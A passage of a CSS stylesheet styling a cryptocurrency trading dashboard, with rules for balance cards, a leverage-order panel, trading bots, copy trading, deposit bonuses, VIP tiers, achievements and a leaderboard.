.mt-btn{flex:1;padding:6px 4px;border:none;border-radius:var(--r-sm);font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono);background:transparent;color:var(--text3)}
.mt-btn.active{background:var(--green);color:#000}
.sidebar-nav{flex:1;padding:12px 0}
.snav-section{padding:8px 16px 4px;font-size:10px;color:var(--text3);font-weight:700;text-transform:uppercase;letter-spacing:1px}
.snav-item{display:flex;align-items:center;gap:9px;padding:9px 16px;font-size:13px;color:var(--text2);cursor:pointer;transition:all .2s;border-left:2px solid transparent}
.snav-item:hover{color:var(--text1);background:var(--bg2)}
.snav-item.active{color:var(--green);background:var(--green3);border-left-color:var(--green)}
.snav-icon{font-size:15px;width:20px;text-align:center}
.snav-badge{margin-left:auto;font-size:10px;padding:2px 6px;background:var(--green3);color:var(--green);border-radius:10px;font-weight:700;font-family:var(--font-mono)}
.sidebar-ref-card{margin:12px;padding:12px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-lg)}
.src-link{font-size:10px;color:var(--text3);font-family:var(--font-mono);word-break:break-all;margin-bottom:8px;line-height:1.4}
.src-copy{width:100%;padding:6px;background:var(--bg3);border:1px solid var(--border);border-radius:var(--r-sm);color:var(--text2);font-size:11px;cursor:pointer;transition:all .2s}
.src-copy:hover{color:var(--text1);border-color:var(--border2)}
.dash-content{padding:20px;overflow-y:auto;display:flex;flex-direction:column;gap:16px;background:var(--bg0)}
.balance-cards{display:grid;grid-template-columns:2fr 1fr 1fr 1fr;gap:12px}
.bal-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:20px;position:relative;overflow:hidden;transition:all .2s}
.bal-card:hover{border-color:var(--border2)}
.bal-card.primary{background:linear-gradient(135deg,rgba(0,230,118,.1),rgba(0,200,83,.04));border-color:rgba(0,230,118,.2)}
.bc-label{font-size:11px;color:var(--text3);text-transform:uppercase;letter-spacing:.6px;font-weight:600;margin-bottom:8px}
.bc-amount{font-family:var(--font-mono);font-size:26px;font-weight:700}
.bc-change{font-size:12px;font-weight:700;padding:2px 7px;border-radius:4px;display:inline-block;margin-top:4px;font-family:var(--font-mono)}
.bc-change.up{color:var(--green);background:var(--green3)}
.bc-change.down{color:var(--red);background:var(--red2)}
.quick-actions{display:grid;grid-template-columns:repeat(7,1fr);gap:10px}
.qa-btn{display:flex;flex-direction:column;align-items:center;gap:6px;padding:16px 8px;border:1px solid var(--border);border-radius:var(--r-xl);background:var(--bg1);cursor:pointer;transition:all .25s;font-size:12px;font-weight:600;color:var(--text2)}
.qa-btn:hover{transform:translateY(-3px);border-color:var(--border2);color:var(--text1);box-shadow:0 6px 20px rgba(0,0,0,.3)}
.qa-icon{font-size:22px}
.qa-trade{border-color:rgba(255,215,64,.2);background:rgba(255,215,64,.04)}.qa-trade:hover{border-color:var(--yellow)}
.qa-deposit{border-color:rgba(0,230,118,.2);background:var(--green3)}.qa-deposit:hover{border-color:var(--green)}
.qa-withdraw{border-color:rgba(68,138,255,.2);background:rgba(68,138,255,.05)}.qa-withdraw:hover{border-color:var(--blue)}
.qa-bots{border-color:rgba(170,119,255,.2);background:rgba(170,119,255,.05)}.qa-bots:hover{border-color:var(--purple)}
.qa-ref{border-color:rgba(0,229,255,.2);background:rgba(0,229,255,.04)}.qa-ref:hover{border-color:var(--cyan)}
.qa-charts{border-color:rgba(255,61,87,.2);background:var(--red2)}.qa-charts:hover{border-color:var(--red)}
.qa-copy{border-color:rgba(68,138,255,.2);background:rgba(68,138,255,.05)}.qa-copy:hover{border-color:var(--blue)}
.dash-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:18px}
.dc-header{display:flex;align-items:center;justify-content:space-between;margin-bottom:14px}
.dc-title{font-family:var(--font-display);font-size:14px;font-weight:700}
.dc-badge{font-size:11px;padding:3px 9px;background:var(--bg3);border-radius:20px;color:var(--text2);font-family:var(--font-mono)}
.dc-link{font-size:12px;color:var(--green);cursor:pointer;font-weight:600}
.dc-tabs{display:flex;gap:4px}
.dc-tab{padding:4px 10px;background:transparent;border:1px solid var(--border);border-radius:var(--r-sm);font-size:11px;font-weight:700;cursor:pointer;color:var(--text3);font-family:var(--font-mono);transition:all .2s}
.dc-tab.active{color:var(--green);border-color:rgba(0,230,118,.3);background:var(--green3)}
.dash-two-col{display:grid;grid-template-columns:1.5fr 1fr;gap:16px}
.dash-three-col{display:grid;grid-template-columns:1fr 1fr 1fr;gap:16px}
.dc-chart-wrap{height:180px;position:relative;margin-bottom:12px}
.dc-chart-wrap canvas{position:absolute;inset:0;width:100%;height:100%}
.perf-footer{display:grid;grid-template-columns:repeat(3,1fr);gap:8px;padding-top:12px;border-top:1px solid var(--border)}
.pf-item{text-align:center}
.pf-lbl{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;display:block;margin-bottom:3px}
.pf-val{font-family:var(--font-mono);font-size:14px;font-weight:700}
.position-row{background:var(--bg2);border-radius:var(--r-lg);padding:12px 14px;margin-bottom:8px;border:1px solid var(--border);transition:all .2s}
.position-row:hover{border-color:var(--border2)}
.pr-top{display:flex;justify-content:space-between;align-items:center;margin-bottom:8px}
.pr-pair{font-weight:700;font-size:13px;font-family:var(--font-display)}
.pr-type{font-size:11px;font-weight:700;padding:2px 8px;border-radius:4px;font-family:var(--font-mono)}
.pr-type.long{color:var(--green);background:var(--green3)}
.pr-type.short{color:var(--red);background:var(--red2)}
.pr-pnl{font-family:var(--font-mono);font-size:15px;font-weight:700}
.pr-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px}
.pr-stat{font-size:10px}
.pr-stat-lbl{color:var(--text3);display:block;margin-bottom:2px}
.pr-stat-val{color:var(--text1);font-family:var(--font-mono);font-weight:600;font-size:11px}
.pr-close-btn{width:100%;margin-top:8px;padding:6px;background:var(--red2);border:1px solid rgba(255,61,87,.3);border-radius:var(--r-sm);color:var(--red);font-size:11px;font-weight:700;cursor:pointer;transition:all .2s}
.pr-close-btn:hover{background:var(--red);color:#fff}
.alloc-chart-wrap{position:relative;width:140px;height:140px;margin:0 auto 12px}
.alloc-chart-wrap canvas{position:absolute;inset:0;width:100%;height:100%}
.alloc-center{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
.ac-amount{font-family:var(--font-mono);font-size:15px;font-weight:700}
.ac-label{font-size:10px;color:var(--text3)}
.alloc-legend{display:flex;flex-direction:column;gap:6px}
.al-row{display:flex;align-items:center;justify-content:space-between;font-size:12px}
.al-dot{width:8px;height:8px;border-radius:50%;flex-shrink:0}
.al-name{color:var(--text2);margin-left:6px;flex:1}
.al-pct{color:var(--text1);font-weight:600;font-family:var(--font-mono)}
.rt-row{display:grid;grid-template-columns:auto 1fr auto auto;gap:8px;align-items:center;padding:8px 0;border-bottom:1px solid var(--border);font-size:12px}
.rt-row:last-child{border-bottom:none}
.rt-type{padding:2px 7px;border-radius:4px;font-size:10px;font-weight:700;font-family:var(--font-mono)}
.rt-type.win{color:var(--green);background:var(--green3)}
.rt-type.loss{color:var(--red);background:var(--red2)}
.rt-pair{font-weight:600;color:var(--text1)}
.rt-pnl{font-family:var(--font-mono);font-weight:700}
.rt-date{font-size:10px;color:var(--text3)}
.msnap-list{display:flex;flex-direction:column;gap:0}
.ms-row{display:flex;align-items:center;justify-content:space-between;padding:8px 0;border-bottom:1px solid var(--border);cursor:pointer;transition:all .15s}
.ms-row:last-child{border-bottom:none}
.ms-row:hover{padding-left:4px}
.ms-sym{font-weight:700;font-size:13px;font-family:var(--font-display)}
.ms-price{font-family:var(--font-mono);font-size:12px}
.ms-chg{font-family:var(--font-mono);font-size:11px;font-weight:700;padding:2px 6px;border-radius:4px}
.kyc-notice{display:flex;align-items:center;justify-content:space-between;padding:16px 20px;background:linear-gradient(135deg,rgba(255,215,64,.12),rgba(245,158,11,.06));border:1px solid rgba(255,215,64,.25);border-radius:var(--r-xl);flex-wrap:wrap;gap:12px}
.kyc-btn{padding:9px 20px;background:var(--yellow);color:#000;border:none;border-radius:var(--r-md);font-size:13px;font-weight:700;cursor:pointer;transition:all .2s}
.empty-state{text-align:center;padding:28px 16px}

/* TRADING PANEL */
.funding-strip{display:flex;align-items:center;gap:16px;padding:6px 20px;background:var(--bg1);border-bottom:1px solid var(--border);flex-wrap:wrap;font-size:11px}
.funding-item{display:flex;flex-direction:column;gap:1px}
.funding-lbl{color:var(--text3);text-transform:uppercase;letter-spacing:.5px;font-size:9.5px;font-weight:600}
.funding-val{font-family:var(--font-mono);font-weight:700;color:var(--text1);font-size:12px}
.funding-timer{color:var(--cyan)}
.long-short-bar{display:flex;flex-direction:column;gap:4px;min-width:180px;margin-left:auto}
.ls-label-row{display:flex;justify-content:space-between;font-size:10px;font-weight:700;font-family:var(--font-mono)}
.ls-long-label{color:var(--green)}
.ls-short-label{color:var(--red)}
.ls-bar{height:6px;background:var(--red);border-radius:3px;overflow:hidden}
.ls-long-fill{height:100%;background:var(--green);border-radius:3px;transition:width 1s ease}
.trade-price-strip{display:flex;align-items:center;gap:20px;padding:9px 20px;background:var(--bg1);border-bottom:1px solid var(--border);flex-wrap:wrap}
.tps-pair{font-family:var(--font-display);font-size:15px;font-weight:800}
.tps-price{font-family:var(--font-mono);font-size:24px;font-weight:700;transition:color .3s}
.tps-chg{font-size:12px;font-weight:700;padding:2px 8px;border-radius:var(--r-sm);font-family:var(--font-mono)}
.tps-stats{display:flex;gap:20px;flex:1;flex-wrap:wrap}
.tps-stat{display:flex;flex-direction:column;gap:1px}
.tps-lbl{font-size:10px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}
.tps-val{font-family:var(--font-mono);font-size:12px;font-weight:600}
.tps-bal{display:flex;flex-direction:column;gap:1px;margin-left:auto;text-align:right}
.trading-body{display:grid;grid-template-columns:1fr 260px 220px;height:calc(100vh - 210px);min-height:480px}
.trade-chart-col{display:flex;flex-direction:column;border-right:1px solid var(--border);min-width:0;overflow:hidden}
.order-panel{background:var(--bg1);border-right:1px solid var(--border);overflow-y:auto;display:flex;flex-direction:column}
.order-panel::-webkit-scrollbar{width:3px}
.order-tabs{display:grid;grid-template-columns:1fr 1fr;border-bottom:1px solid var(--border)}
.ot-btn{padding:14px 8px;border:none;font-size:13px;font-weight:800;cursor:pointer;transition:all .2s;font-family:var(--font-mono);background:var(--bg2);color:var(--text3)}
.ot-btn.buy.active{background:var(--green3);color:var(--green);border-bottom:2px solid var(--green)}
.ot-btn.sell.active{background:var(--red2);color:var(--red);border-bottom:2px solid var(--red)}
.order-type-row{display:flex;gap:4px;padding:10px 12px;border-bottom:1px solid var(--border)}
.order-type-btn{flex:1;padding:5px 4px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-sm);color:var(--text3);font-size:11px;font-weight:600;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.order-type-btn.active{color:var(--text1);border-color:var(--border2);background:var(--bg3)}
.op-group{padding:10px 12px;border-bottom:1px solid var(--border)}
.op-label{display:flex;justify-content:space-between;font-size:11px;color:var(--text3);font-weight:600;text-transform:uppercase;letter-spacing:.5px;margin-bottom:6px}
.op-leverage-val{color:var(--yellow);font-family:var(--font-mono);font-size:13px;font-weight:800}
.op-input-wrap{display:flex;align-items:center;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);overflow:hidden}
.op-input{flex:1;padding:9px 10px;background:transparent;border:none;color:var(--text1);font-size:14px;font-family:var(--font-mono);outline:none}
.op-input::placeholder{color:var(--text3)}
.op-input-suffix{padding:0 10px;font-size:11px;color:var(--text3);font-family:var(--font-mono);font-weight:600;border-left:1px solid var(--border)}
.op-input-wrap:focus-within{border-color:rgba(0,230,118,.4)}
.quick-pct-row{display:flex;gap:4px;margin-top:8px}
.qp-btn{flex:1;padding:4px;background:var(--bg3);border:1px solid var(--border);border-radius:4px;color:var(--text3);font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.qp-btn:hover{color:var(--green);border-color:rgba(0,230,118,.3);background:var(--green3)}
.leverage-slider{width:100%;height:4px;margin:8px 0 4px;appearance:none;-webkit-appearance:none;background:linear-gradient(to right,var(--green) 0%,var(--green) 10%,var(--bg3) 10%,var(--bg3) 100%);border-radius:2px;outline:none;cursor:pointer}
.leverage-slider::-webkit-slider-thumb{appearance:none;width:14px;height:14px;background:var(--green);border-radius:50%;cursor:pointer;box-shadow:0 0 6px rgba(0,230,118,.5)}
.leverage-marks{display:flex;justify-content:space-between;font-size:10px;color:var(--text3);font-family:var(--font-mono)}
.leverage-marks span{cursor:pointer;transition:color .2s}
.leverage-marks span:hover{color:var(--green)}
.order-summary{padding:10px 12px;border-bottom:1px solid var(--border);background:var(--bg0)}
.os-row{display:flex;justify-content:space-between;font-size:11px;padding:3px 0}
.os-row span:first-child{color:var(--text3)}
.os-row span:last-child{font-family:var(--font-mono);font-weight:600;color:var(--text1)}
.risk-warning{display:flex;align-items:center;gap:8px;padding:8px 12px;background:rgba(255,215,64,.08);border-bottom:1px solid rgba(255,215,64,.15);font-size:11px;color:var(--yellow)}
.order-submit-btn{width:100%;padding:15px;border:none;font-size:15px;font-weight:800;cursor:pointer;transition:all .2s;font-family:var(--font-mono);letter-spacing:.5px}
.order-submit-btn.buy{background:linear-gradient(135deg,var(--green),var(--green2));color:#000}
.order-submit-btn.sell{background:linear-gradient(135deg,var(--red),#c92a40);color:#fff}
.order-submit-btn:hover{transform:translateY(-1px);box-shadow:0 6px 20px rgba(0,0,0,.3)}
.op-mode-row{display:flex;align-items:center;gap:8px;padding:10px 12px;margin-top:auto;border-top:1px solid var(--border)}
.op-mode-btn{padding:4px 12px;background:var(--bg2);border:1px solid var(--border);border-radius:20px;font-size:11px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono);color:var(--text3)}
.op-mode-btn.active{background:var(--green);color:#000;border-color:var(--green)}
.trade-right-col{display:flex;flex-direction:column;overflow:hidden;background:var(--bg1)}
.mini-ob{border-bottom:1px solid var(--border);flex-shrink:0}
.mob-header{padding:8px 12px;font-size:12px;font-weight:700;font-family:var(--font-display);border-bottom:1px solid var(--border)}
.my-positions{flex:1;overflow-y:auto;display:flex;flex-direction:column;border-bottom:1px solid var(--border)}
.my-pos-row{padding:8px 10px;border-bottom:1px solid var(--border);font-size:11px}
.mpr-top{display:flex;justify-content:space-between;margin-bottom:4px}
.mpr-pair{font-weight:700;font-family:var(--font-display)}
.mpr-pnl{font-family:var(--font-mono);font-weight:700}
.mpr-stats{display:flex;gap:8px;font-size:10px;color:var(--text3);font-family:var(--font-mono)}
.mpr-close{background:var(--red2);border:1px solid rgba(255,61,87,.2);border-radius:3px;color:var(--red);font-size:10px;font-weight:700;cursor:pointer;padding:2px 6px;float:right;margin-top:4px;transition:all .2s}
.mpr-close:hover{background:var(--red);color:#fff}

/* RISK CALCULATOR */
.risk-calc{background:var(--bg0);border-radius:var(--r-md);padding:12px;border:1px solid var(--border);margin:8px 12px}
.risk-meter{height:8px;background:var(--bg3);border-radius:4px;overflow:hidden;margin:8px 0}
.risk-fill{height:100%;border-radius:4px;transition:all .4s ease}
.liq-warning-bar{display:none;padding:8px 12px;background:rgba(255,61,87,.1);border:1px solid rgba(255,61,87,.3);border-radius:var(--r-sm);font-size:11px;color:var(--red);margin:0 12px 8px;align-items:center;gap:6px}
.liq-warning-bar.show{display:flex;animation:pulse 1s ease-in-out infinite}

/* BOTS */
.bots-grid{display:grid;grid-template-columns:repeat(auto-fill,minmax(280px,1fr));gap:16px}
.bot-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:20px;transition:all .25s}
.bot-card.active-bot{border-color:rgba(0,230,118,.35);background:rgba(0,230,118,.03)}
.bot-card:hover{border-color:var(--border2);transform:translateY(-2px);box-shadow:0 8px 28px rgba(0,0,0,.3)}
.bc-top{display:flex;align-items:center;gap:12px;margin-bottom:12px}
.bc-icon{width:44px;height:44px;border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.bc-name{font-family:var(--font-display);font-size:15px;font-weight:700}
.bc-risk{font-size:11px;font-weight:600}
.bc-status{margin-left:auto;font-size:11px;font-weight:800;font-family:var(--font-mono)}
.bc-status.on{color:var(--green)}.bc-status.off{color:var(--text3)}
.bc-desc{font-size:12px;color:var(--text2);line-height:1.55;margin-bottom:14px}
.bc-stats{display:grid;grid-template-columns:repeat(4,1fr);gap:6px;margin-bottom:12px}
.bc-stat{background:var(--bg2);border-radius:var(--r-sm);padding:8px 4px;text-align:center}
.bcs-val{font-family:var(--font-mono);font-size:13px;font-weight:700}
.bcs-lbl{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:.4px;margin-top:2px}
.bc-pairs{font-size:11px;color:var(--text3);margin-bottom:12px}
.bc-toggle-btn{width:100%;padding:10px;border:none;border-radius:var(--r-md);font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.bc-toggle-btn.start{background:var(--green);color:#000}
.bc-toggle-btn.stop{background:var(--red2);border:1px solid rgba(255,61,87,.3);color:var(--red)}
.bc-toggle-btn.start:hover{background:var(--green2)}
.bc-toggle-btn.stop:hover{background:var(--red);color:#fff}
.bc-running{display:flex;align-items:center;font-size:11px;color:var(--green);margin-top:8px;font-family:var(--font-mono)}

/* SIGNALS */
.signal-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:18px;transition:all .25s;cursor:pointer;position:relative;overflow:hidden}
.signal-card::after{content:'';position:absolute;top:0;left:0;right:0;height:3px;opacity:0;transition:opacity .25s}
.signal-card:hover{border-color:var(--border2);transform:translateY(-3px);box-shadow:0 12px 36px rgba(0,0,0,.4)}
.signal-card:hover::after{opacity:1}
.signal-card.buy-sig::after{background:linear-gradient(90deg,var(--green),var(--cyan))}
.signal-card.sell-sig::after{background:linear-gradient(90deg,var(--red),#ff6b8a)}
.sig-direction{display:inline-flex;align-items:center;gap:6px;padding:5px 14px;border-radius:20px;font-size:12px;font-weight:800;font-family:var(--font-mono)}
.sig-direction.buy{background:var(--green3);color:var(--green);border:1px solid rgba(0,230,118,.3)}
.sig-direction.sell{background:var(--red2);color:var(--red);border:1px solid rgba(255,61,87,.3)}
.sig-stat{background:var(--bg2);border-radius:var(--r-md);padding:8px 10px}
.sig-stat-lbl{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px;margin-bottom:3px}
.sig-stat-val{font-family:var(--font-mono);font-size:13px;font-weight:700}
.conf-bar{flex:1;height:4px;background:var(--bg3);border-radius:2px;overflow:hidden}
.conf-fill{height:100%;border-radius:2px;transition:width .6s ease}
.ind-tag{padding:3px 8px;border-radius:4px;font-size:10px;font-weight:700;font-family:var(--font-mono)}
.ind-bull{background:var(--green3);color:var(--green)}
.ind-bear{background:var(--red2);color:var(--red)}

/* COPY TRADING */
.copy-trader-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:20px;transition:all .25s;position:relative;overflow:hidden}
.copy-trader-card::before{content:'';position:absolute;top:0;left:0;right:0;height:3px;background:linear-gradient(90deg,var(--green),var(--cyan));opacity:0;transition:opacity .25s}
.copy-trader-card:hover{border-color:var(--border2);transform:translateY(-3px);box-shadow:0 12px 40px rgba(0,0,0,.4)}
.copy-trader-card:hover::before{opacity:1}
.copy-trader-card.is-copying{border-color:rgba(0,230,118,.3);background:rgba(0,230,118,.02)}
.copy-trader-card.is-copying::before{opacity:1}
.ct-avatar{width:52px;height:52px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:24px;flex-shrink:0;position:relative;border:2px solid var(--border2)}
.ct-verified{position:absolute;bottom:-2px;right:-2px;width:16px;height:16px;background:var(--blue);border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:9px;border:1px solid var(--bg1)}
.ct-stat{background:var(--bg2);border-radius:var(--r-md);padding:10px 8px;text-align:center}
.ct-stat-val{font-family:var(--font-mono);font-size:14px;font-weight:800;display:block}
.ct-stat-lbl{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:.4px;margin-top:2px;display:block}
.copy-btn{width:100%;padding:11px;border:none;border-radius:var(--r-md);font-size:13px;font-weight:700;cursor:pointer;transition:all .2s;font-family:var(--font-mono)}
.copy-btn.start{background:linear-gradient(135deg,var(--blue),#2962FF);color:#fff}
.copy-btn.stop{background:var(--red2);border:1px solid rgba(255,61,87,.3);color:var(--red)}
.copy-btn.start:hover{transform:translateY(-1px);box-shadow:0 4px 16px rgba(68,138,255,.4)}
.copy-btn.stop:hover{background:var(--red);color:#fff}
.ct-badge{display:inline-flex;align-items:center;gap:3px;padding:2px 7px;border-radius:10px;font-size:10px;font-weight:700;font-family:var(--font-mono)}
.ct-badge-gold{background:rgba(255,215,64,.15);color:var(--yellow);border:1px solid rgba(255,215,64,.3)}
.ct-badge-blue{background:rgba(68,138,255,.15);color:var(--blue);border:1px solid rgba(68,138,255,.3)}
.ct-badge-green{background:var(--green3);color:var(--green);border:1px solid rgba(0,230,118,.3)}
.ct-badge-purple{background:rgba(170,119,255,.15);color:var(--purple);border:1px solid rgba(170,119,255,.3)}

/* HEATMAP */
.hm-cell{border-radius:var(--r-md);padding:14px 8px;text-align:center;cursor:pointer;transition:all .2s}
.hm-cell:hover{transform:scale(1.06)}
.hm-sym{font-family:var(--font-display);font-size:12px;font-weight:800;margin-bottom:3px}
.hm-chg{font-family:var(--font-mono);font-size:12px;font-weight:700}

/* DEPOSIT */
.dep-method-btn{display:flex;flex-direction:column;align-items:center;padding:14px 8px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-lg);cursor:pointer;transition:all .2s;color:var(--text2)}
.dep-method-btn.active{border-color:var(--green);background:var(--green3);color:var(--text1)}
.dep-method-btn:hover{border-color:var(--border2);color:var(--text1)}
.dep-bonus-banner{background:linear-gradient(135deg,rgba(255,215,64,.15),rgba(245,158,11,.08));border:1px solid rgba(255,215,64,.3);border-radius:var(--r-xl);padding:16px 20px;margin-bottom:20px;position:relative;overflow:hidden}
.dbb-title{font-size:14px;font-weight:800;color:var(--yellow);margin-bottom:4px;display:flex;align-items:center;gap:6px}
.dbb-sub{font-size:12px;color:var(--text2);margin-bottom:12px}
.dbb-progress{height:8px;background:var(--bg3);border-radius:4px;overflow:hidden;margin-bottom:6px}
.dbb-fill{height:100%;border-radius:4px;background:linear-gradient(90deg,var(--yellow),#FF9800);transition:width .6s ease}
.dbb-labels{display:flex;justify-content:space-between;font-size:10px;font-family:var(--font-mono)}
.dbb-tiers{display:flex;gap:8px;margin-top:10px;flex-wrap:wrap}
.dbb-tier{padding:4px 10px;border-radius:20px;font-size:11px;font-weight:700;font-family:var(--font-mono)}
.dbb-tier.locked{background:var(--bg3);color:var(--text3);border:1px solid var(--border)}
.dbb-tier.active{background:rgba(255,215,64,.2);color:var(--yellow);border:1px solid rgba(255,215,64,.4)}
.dbb-tier.unlocked{background:var(--green3);color:var(--green);border:1px solid rgba(0,230,118,.3)}

/* VIP */
.vip-tier-bar{display:flex;align-items:center;gap:8px;padding:10px 16px;background:var(--bg1);border-bottom:1px solid var(--border);overflow-x:auto;white-space:nowrap}
.vip-tier-bar::-webkit-scrollbar{height:0}
.vip-badge{display:inline-flex;align-items:center;gap:5px;padding:5px 12px;border-radius:20px;font-size:11px;font-weight:800;font-family:var(--font-mono);cursor:pointer;transition:all .2s;flex-shrink:0}
.vip-bronze{background:rgba(205,127,50,.15);color:#CD7F32;border:1px solid rgba(205,127,50,.3)}
.vip-silver{background:rgba(192,192,192,.15);color:#C0C0C0;border:1px solid rgba(192,192,192,.3)}
.vip-gold{background:rgba(255,215,64,.15);color:var(--yellow);border:1px solid rgba(255,215,64,.3)}
.vip-platinum{background:linear-gradient(135deg,rgba(0,229,255,.15),rgba(170,119,255,.15));color:#E0E0E0;border:1px solid rgba(0,229,255,.3)}
.vip-diamond{background:linear-gradient(135deg,rgba(0,229,255,.2),rgba(68,138,255,.2));color:var(--cyan);border:1px solid rgba(0,229,255,.4)}
.vip-current{transform:scale(1.08);box-shadow:0 4px 16px rgba(255,215,64,.2)}

/* ACHIEVEMENTS */
.achievement-card{background:var(--bg1);border:1px solid var(--border);border-radius:var(--r-xl);padding:16px;text-align:center;transition:all .25s;position:relative;overflow:hidden}
.achievement-card.unlocked{border-color:rgba(255,215,64,.4);background:rgba(255,215,64,.03)}
.achievement-card.locked{opacity:.55;filter:grayscale(.4)}
.ach-icon{font-size:32px;margin-bottom:8px;display:block}
.ach-name{font-size:12px;font-weight:700;margin-bottom:3px}
.ach-desc{font-size:10px;color:var(--text3)}
.ach-progress{margin-top:8px;height:3px;background:var(--bg3);border-radius:2px;overflow:hidden}
.ach-progress-fill{height:100%;border-radius:2px;background:var(--yellow)}
.ach-unlocked-glow{position:absolute;inset:0;background:radial-gradient(circle at 50% 0%,rgba(255,215,64,.1),transparent 60%);pointer-events:none}

/* DAILY CHALLENGE */
.challenge-card{background:linear-gradient(135deg,rgba(170,119,255,.12),rgba(68,138,255,.08));border:1px solid rgba(170,119,255,.3);border-radius:var(--r-xl);padding:18px;position:relative;overflow:hidden}
.challenge-card::before{content:'âš¡';position:absolute;right:16px;top:50%;transform:translateY(-50%);font-size:48px;opacity:.08}
.challenge-timer{font-family:var(--font-mono);font-size:11px;color:var(--purple);font-weight:700}
.challenge-progress{height:6px;background:var(--bg3);border-radius:3px;overflow:hidden;margin:10px 0 6px}
.challenge-fill{height:100%;border-radius:3px;background:linear-gradient(90deg,var(--purple),var(--blue));transition:width .5s ease}

/* STREAK */
.streak-display{display:flex;align-items:center;gap:8px;padding:10px 16px;background:linear-gradient(135deg,rgba(255,61,87,.12),rgba(255,107,62,.06));border:1px solid rgba(255,107,62,.25);border-radius:var(--r-xl);margin-bottom:16px}
.streak-flame{font-size:24px;animation:pulse 1.5s ease-in-out infinite}
.streak-days{font-family:var(--font-mono);font-size:22px;font-weight:900;color:#FF6B3D}
.streak-dots{display:flex;gap:4px;margin-top:4px}
.streak-dot{width:8px;height:8px;border-radius:50%}
.streak-dot.done{background:linear-gradient(135deg,#FF6B3D,#FF3D57)}
.streak-dot.today{background:var(--yellow);animation:pulse 1s infinite}
.streak-dot.future{background:var(--bg4)}

/* HEALTH SCORE */
.health-score-ring{width:100px;height:100px;position:relative;margin:0 auto 12px}
.health-score-ring svg{width:100%;height:100%;transform:rotate(-90deg)}
.health-score-ring circle{fill:none;stroke-width:8;transition:stroke-dashoffset .8s ease}
.health-score-center{position:absolute;inset:0;display:flex;flex-direction:column;align-items:center;justify-content:center}
.health-score-val{font-family:var(--font-mono);font-size:22px;font-weight:900}
.health-score-lbl{font-size:9px;color:var(--text3);text-transform:uppercase;letter-spacing:.5px}

/* LEADERBOARD */
.lb-row{display:flex;align-items:center;gap:12px;padding:12px 14px;border-bottom:1px solid var(--border);transition:background .15s;cursor:pointer}
.lb-row:hover{background:var(--bg2)}
.lb-row:last-child{border-bottom:none}
.lb-rank{font-family:var(--font-mono);font-size:16px;font-weight:800;width:32px;text-align:center;flex-shrink:0}
.lb-avatar{width:36px;height:36px;border-radius:50%;display:flex;align-items:center;justify-content:center;font-size:18px;flex-shrink:0}
.lb-name{font-weight:700;font-size:13px}
.lb-country{font-size:11px;color:var(--text3)}
.lb-profit{font-family:var(--font-mono);font-size:14px;font-weight:800;color:var(--green);margin-left:auto}
.lb-roi{font-size:11px;color:var(--text2);font-family:var(--font-mono)}

/* SESSION WARNING */
.session-warning{position:fixed;inset:0;background:rgba(0,0,0,.85);z-index:3000;display:flex;align-items:center;justify-content:center;padding:20px;backdrop-filter:blur(8px)}
.session-box{background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-xl);padding:36px;text-align:center;max-width:380px;width:100%;animation:countUp .3s ease}

/* ONBOARDING TOUR */
.tour-overlay{position:fixed;inset:0;z-index:2500;pointer-events:none}
.tour-spotlight{position:absolute;border-radius:var(--r-lg);box-shadow:0 0 0 9999px rgba(0,0,0,.75);transition:all .4s ease;pointer-events:none}
.tour-tooltip{position:absolute;background:var(--bg2);border:1px solid var(--border2);border-radius:var(--r-xl);padding:20px;width:280px;box-shadow:0 20px 60px rgba(0,0,0,.8);pointer-events:all;animation:countUp .3s ease;z-index:2501}
.tour-step-dots{display:flex;gap:4px;margin-bottom:12px}
.tour-dot{width:6px;height:6px;border-radius:50%;background:var(--border2)}
.tour-dot.active{background:var(--green);width:18px;border-radius:3px}

/* DEVICE MANAGEMENT */
.device-row{display:flex;align-items:center;gap:14px;padding:14px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-lg);margin-bottom:8px;transition:all .2s}
.device-row:hover{border-color:var(--border2)}
.device-icon{width:40px;height:40px;background:var(--bg3);border-radius:var(--r-md);display:flex;align-items:center;justify-content:center;font-size:20px;flex-shrink:0}
.device-current{color:var(--green);font-size:10px;font-weight:700;font-family:var(--font-mono)}

/* WHITELIST */
.whitelist-row{display:flex;align-items:center;gap:10px;padding:10px 14px;background:var(--bg2);border:1px solid var(--border);border-radius:var(--r-md);margin-bottom:6px;font-size:12px}
.whitelist-addr{font-family:var(--font-mono);font-size:11px;color:var(--text2);flex:1;word-break:break-all}
.whitelist-verified{color:var(--green);font-size:10px;font-weight:700}

/* ALERTS */
.alert-row{display:flex;align-items:center;gap:10px;padding:10px 0;border-bottom:1px solid var(--border);font-size:12px}
.alert-row:last-child{border-bottom:none}
.alert-active{color:var(--green);font-size:10px;font-weight:700;font-family:var(--font-mono)}
.alert-delete{background:none;border:none;color:var(--red);cursor:pointer;font-size:14px;margin-left:auto;padding:2px 6px;transition:all .2s}
.alert-delete:hover{background:var(--red2);border-radius:4px}

/* ANTI-PHISHING */
